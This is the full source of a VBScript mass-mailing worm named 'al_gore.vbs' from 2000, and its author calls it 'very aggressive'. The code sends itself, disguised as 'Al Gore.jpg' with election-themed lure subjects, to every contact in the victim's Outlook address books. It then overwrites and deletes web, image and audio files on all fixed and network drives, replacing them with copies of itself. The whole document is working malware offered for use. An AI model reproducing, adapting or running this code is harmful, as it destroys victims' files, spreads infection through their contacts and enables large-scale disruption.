' File: al_gore.vbs
' Version: 1.21
' Release Date: 9/28/00
' Author: butt3rkup <butt3rkup@hotmail.com>

' Comments: Potentially very aggressive worm.  Use with caution.
' Compatability: Win 98/Me/NT/2000  (Win95 if IE5.x installed)

Option Explicit

Dim wsh,fso,file,win,sys,tmp,trojan,drive,vcopy
Const WinFolder = 0
Const SysFolder = 1
Const TmpFolder = 2
Const FixedDrive = 2
Const NetDrive = 3
Const olMailItem = 0
Const olTo = 1
Const olCc = 2
Const olBcc = 3
Const olOriginator = 0
Set wsh = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
Set sys = fso.GetSpecialFolder(SysFolder)
Set tmp = fso.GetSpecialFolder(TmpFolder)
Set trojan = fso.GetFile(WScript.ScriptFullName)
Set drive = fso.Drives
vcopy = file.ReadAll

main()

sub main
	trojan.Copy(tmp & "\al_gore.vbs")
	spam()
	get_folders()
end sub

sub spam
	On Error Resume Next
	Dim mailer,mapi,lists,abook,x,adrlist,user,email,sName,sHead,sSubject
	Set mailer = WScript.CreateObject("Outlook.Application")
	Set mapi = mailer.GetNameSpace("MAPI")
		For lists = 1 To mapi.AddressLists.Count
			Set abook = mapi.AddressLists(lists)
			x = 1
				For adrlist = 1 To abook.AddressEntries.Count
				Set user = abook.AddressEntries(x)
				Set email = mailer.CreateItem(olMailItem)
				sName = Split(user.name," ")
				sSubject = subject_text
				With email
					.Subject = sSubject
					.Body = sName(0) & "," & VbCrLf & VbCrLf & "I thought you would find this interesting :) Call me later!" & VbCrLf & VbCrLf
				With .Recipients.Add(user)
					.type = olTo
				End With
				With .Recipients.Add("cybercrime@techtv.com")
					.type = olBcc
				End With
				With .Attachments.Add(tmp & "\al_gore.vbs")
					.DisplayName = "Al Gore.jpg"
				End With
					.Send
				End With
				x = x + 1
				Next
		Next
	Set mailer = Nothing
	Set mapi = Nothing
end sub

sub get_folders
	On Error Resume Next
	Dim t,folder,sfolder,ffile
		For Each t In drive
			If (t.DriveType = FixedDrive) Or (t.DriveType = NetDrive) Then
				Set folder = fso.GetFolder(t.path & "\")
				Set sfolder = folder.SubFolders
				For Each ffile in sfolder
					replicate(ffile.path)
					get_subfolders(ffile.path)
				Next
			End If
		Next
end sub

sub get_subfolders(folderinfo)
	Dim folder,sfolder,ffile
	Set folder = fso.GetFolder(folderinfo)
	Set sfolder = folder.SubFolders
		For Each ffile In sFolder
			replicate(ffile.path)
			get_subfolders(ffile.path)
		Next		
end sub

sub replicate(folderinfo)
	Dim fldr,fls,ft,ext,otf,cp
	Set fldr = fso.GetFolder(folderinfo)
	Set fls = fldr.Files
		For Each ft In fls
			ext = fso.GetExtensionName(ft.Path)
				If (ext = "cfm") Or (ext = "asp") Or (ext = "jpg") Or (ext = "gif") Or (ext = "htm") Or (ext = "html") Or (ext = "css") Or (ext = "mp3") Or (ext = "mp2") Or (ext = "mod") Or (ext = "mpeg") Or (ext = "mpg") Then
					Set otf = fso.OpenTextFile(ft.Path,2,True)
					otf.Write vcopy
					otf.Close
					Set cp = fso.GetFile(ft.Path)
					cp.Copy(ft.Path & ".vbs")
					fso.DeleteFile(ft.Path)
				End If
		Next
end sub

function subject_text()
	Dim i,sText
	i = Int((10 * Rnd)+1)
	Select Case i
		Case 1
			sText = "Al and tipper?"
		Case 2
			sText = "what would Al do?"
		Case 3
			sText = "Al Gore meets Christy Brinkley!"
		Case 4
			sText = "Election 2000"
		Case 5
			sText = "Boxers or Briefs?"
		Case 6
			sText = "This is so funny... :)"
		Case 7
			sText = "Dubya wishes..."
		Case 8
			sText = "Al Gore.jpg"
		Case 9
			sText = "Gore raises $ for mutant cats! :)"
		Case 10
			sText = "It's Al's birthday!"
	End Select
	subject_text = sText
end function